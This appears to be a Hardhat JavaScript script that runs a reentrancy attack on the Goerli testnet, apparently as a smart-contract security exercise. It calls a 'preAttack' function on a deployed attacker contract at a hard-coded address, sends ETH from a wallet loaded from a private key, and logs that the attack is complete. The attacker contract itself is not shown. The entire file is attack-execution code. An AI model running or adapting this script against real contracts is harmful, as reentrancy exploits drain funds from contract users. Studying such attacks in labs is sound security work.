const hre = require("hardhat");
require("dotenv").config();
async function main() {


  const attackAmount = hre.ethers.utils.parseEther("0.001");
   const reentranceAddr="0x9A5546c752f76AA3B645DEdc7B682C08b0D6ccE5"
 
   const reentrance = await hre.ethers.getContractAt("Reentrancy", reentranceAddr);

   await reentrance.preAttack({value:attackAmount});
   console.log("Preattack initiated!!")
   const provider = new ethers.providers.AlchemyProvider('goerli', process.env.ALCHEMY_API_KEY);
   const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);

   const transaction = await wallet.sendTransaction({
    to: reentranceAddr,
    value: ethers.utils.parseEther('0.001')
  });

  console.log('Transaction hash:', transaction.hash);

  const receipt = await transaction.wait();
  console.log('Transaction confirmed in block', receipt.blockNumber);

  console.log("Reentrancy attack completed!!")
 
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});